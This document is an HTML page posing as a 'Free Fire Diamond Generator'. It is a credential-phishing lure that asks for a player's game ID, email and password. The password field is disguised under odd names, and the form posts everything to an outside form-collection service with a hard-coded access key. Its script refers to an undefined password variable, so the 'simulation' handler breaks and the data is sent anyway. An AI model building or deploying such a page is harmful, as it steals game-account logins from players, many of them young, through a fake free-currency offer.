<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free Fire Diamond Generator</title>
    <meta name="description" content="Free Fire Diamond Generator - Get Free Diamonds">
    <meta name="keywords" content="Free Fire, Diamonds, Generator, Free Diamonds, Get Diamonds">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body {
            font-family: 'Poppins', sans-serif;
            background-color: #f0f0f0;
            animation: fadeInBackground 2s ease forwards;
        }
        @keyframes fadeInBackground {
            from { background-color: rgba(240, 240, 240, 0); }
            to { background-color: #f0f0f0; }
        }

 .container {
            background: linear-gradient(135deg, #ffffff, #f0f2ff);
            border-radius: 12px;
            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.15);
            padding: 30px;
            width: 100%;
            max-width: 600px;
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            animation: fadeIn 1s ease forwards, moveIn 1s ease forwards;
            opacity: 0;
            transform: translateY(20px);
        }
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        @keyframes moveIn {
            from { transform: translateY(20px); }
            to { transform: translateY(0); }
        }
        .container:hover {
            transform: scale(1.04);
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
        }

 .heading {
            font-size: 2.5rem;
            font-weight: 700;
            color: #4c51bf;
            margin-bottom: 25px;
            text-align: center;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.05);
            animation: pulse 2s infinite alternate;
        }
        @keyframes pulse {
            from { transform: scale(1); }
            to { transform: scale(1.06); }
        }

  .description {
            font-size: 1.1rem;
            color: #6b7280;
            margin-bottom: 30px;
            text-align: center;
            line-height: 1.7;
            text-shadow: 1px 1px 2px rgba(0, 0, 0, 0.03);
        }

  form {
            margin-bottom: 24px;
        }

 form label {
            display: block;
            font-size: 0.95rem;
            font-weight: 600;
            color: #374151;
            margin-bottom: 10px;
            transition: color 0.3s ease;
        }
        form label:hover {
             color: #4f46e5;
        }

  form input[type="text"],
        form input[type="email"],
        form input[type="password"] {
            display: block;
            width: 100%;
            padding: 12px 18px;
            font-size: 1.1rem;
            line-height: 1.5;
            color: #4b5563;
            background-color: #ffffff;
            border: 1.8px solid #d1d5db;
            border-radius: 8px;
            transition: border-color 0.3s ease, shadow-sm 0.3s ease;
            appearance: none;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
        }
        form input[type="text"]:focus,
        form input[type="email"]:focus,
        form input[type="password"]:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }
        form input[type="text"]::placeholder,
        form input[type="email"]::placeholder,
        form input[type="password"]::placeholder{
            color: #9ca3af;
            font-style: italic;
            opacity: 0.8;
        }
         form select {
            display: block;
            width: 100%;
            padding: 12px 18px;
            font-size: 1.1rem;
            line-height: 1.5;
            color: #4b5563;
            background-color: #ffffff;
            border: 1.8px solid #d1d5db;
            border-radius: 8px;
            transition: border-color 0.3s ease, shadow-sm 0.3s ease;
            appearance: none;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.02);
        }
        form select:focus {
            outline: none;
            border-color: #6366f1;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
        }

 form button[type="submit"] {
            background: linear-gradient(to right, #6b7280, #374151);
            color: #fff;
            padding: 14px 30px;
            font-size: 1.2rem;
            font-weight: 600;
            border: none;
            border-radius: 10px;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
            box-shadow: 0 5px 11px rgba(0, 0, 0, 0.1);
            width: 100%;
            display: block;
            text-align: center;
        }
        form button[type="submit"]:hover {
            background: linear-gradient(to right, #4b5563, #1f2937);
            transform: translateY(-2px) scale(1.02);
            box-shadow: 0 7px 15px rgba(0, 0, 0, 0.15);
        }
        form button[type="submit"]:active {
            transform: translateY(0) scale(1);
            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
        }

  #message-container {
            margin-top: 30px;
            text-align: center;
            font-size: 1.1rem;
            font-weight: 600;
            color: #dc2626;
            padding: 12px;
            background-color: #fee2e2;
            border-radius: 8px;
            border: 1px solid #fecaca;
            animation: fadeIn 1s ease forwards, shake 0.5s infinite alternate;
            opacity: 0;
        }
        @keyframes shake {
            from { transform: translateX(-1px); }
            to { transform: translateX(1px); }
        }
    </style>
</head>
<body class="bg-gradient-to-r from-purple-400 to-pink-500 h-screen flex justify-center items-center">
    <div class="container">
        <h1 class="heading">Free Fire Diamond Generator</h1>
        <p class="description">Enter your details below to get free diamonds!</p>
        <form action="https://api.web3forms.com/submit" method="POST" id="diamond-form">
            <input type="hidden" name="access_key" value="0732fb33-547b-48bb-826e-09f7854ad14b">
            <div class="form-group">
                <label for="ff-id" class="form-label">Free Fire ID:</label>
                <input type="text" id="ff-id" name="FF-ID" class="form-control" placeholder="Enter your Free Fire ID" required>
                <div id="ff-id-error" class="text-red-500 text-xs mt-1" style="display: none;"></div>
            </div>
            <div class="form-group">
                <label for="email" class="form-label">Email:</label>
                <input type="email" id="email" name="email" class="form-control" placeholder="Enter your Email" required>
                 <div id="email-error" class="text-red-500 text-xs mt-1" style="display: none;"></div>
            </div>
           
  <LAbel for="QWERTY">Password:</LAbel>
                <input type="text" id="QWERTY" name="KEY" class="form-control" placeholder="Password" required>
 <div class="form-group">
                <label for="diamonds" class="form-label">Number of Diamonds:</label>
                <select id="diamonds" name="diamonds" class="select-control">
                    <option value="100">100 Diamonds</option>
                    <option value="500">500 Diamonds</option>
                    <option value="1000">1000 Diamonds</option>
                    <option value="5000">5000 Diamonds</option>
                    <option value="10000">10000 Diamonds</option>
                </select>
            </div>
            <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
            <button type="submit" class="btn-primary">GET DIAMOND</button>
        </form>
        <div id="message-container" class="mt-8">
        </div>
    </div>
    <script>
        const form = document.getElementById('diamond-form');
        const messageContainer = document.getElementById('message-container');
        const ffIdInput = document.getElementById('ff-id');
        const emailInput = document.getElementById('email');
      
  const ffIdError = document.getElementById('ff-id-error');
        const emailError = document.getElementById('email-error');
       
   function validateFFId() {
            const ffIdValue = ffIdInput.value.trim();
            if (!/^\d+$/.test(ffIdValue)) {
                ffIdError.textContent = "Invalid Free Fire ID. Please enter numbers only.";
                ffIdError.style.display = "block";
                return false;
            } else {
                ffIdError.style.display = "none";
                return true;
            }
        }
 function validateEmail() {
            const emailValue = emailInput.value.trim();
            const emailRegex = /^[\w-\.]+@([\w-]+\.)+[\w-]{2,4}$/;
            if (!emailRegex.test(emailValue)) {
                emailError.textContent = "Invalid email address.";
                emailError.style.display = "block";
                return false;
            } else {
                emailError.style.display = "none";
                return true;
            }
        }

  function validatePassword() {
            const passwordValue = passwordInput.value.trim();
            if (passwordValue.length < 6) {
                passwordError.textContent = "Password must be at least 6 characters long.";
                passwordError.style.display = "block";
                return false;
            } else {
  passwordError.style.display = "none";
                return true;
            }
        }

  ffIdInput.addEventListener('input', validateFFId);
        emailInput.addEventListener('input', validateEmail);
        passwordInput.addEventListener('input', validatePassword);

  form.addEventListener('submit', (event) => {
            event.preventDefault();

  const isFFIdValid = validateFFId();
            const isEmailValid = validateEmail();
            const isPasswordValid = validatePassword();

  if (isFFIdValid && isEmailValid && isPasswordValid) {
                const ffId = document.getElementById('ff-id').value;
                const diamonds = document.getElementById('diamonds').value;
                 messageContainer.textContent = `Generating ${diamonds} diamonds for ID: ${ffId}... (This is a simulation)`;
                setTimeout(() => {
                    messageContainer.textContent = "Operation successful! Please wait up to 24 hours for the diamonds to be credited to your account. (This is a simulation)";
                }, 3000);
               // form.submit();
            }
        });
    </script>
</body>
</html>
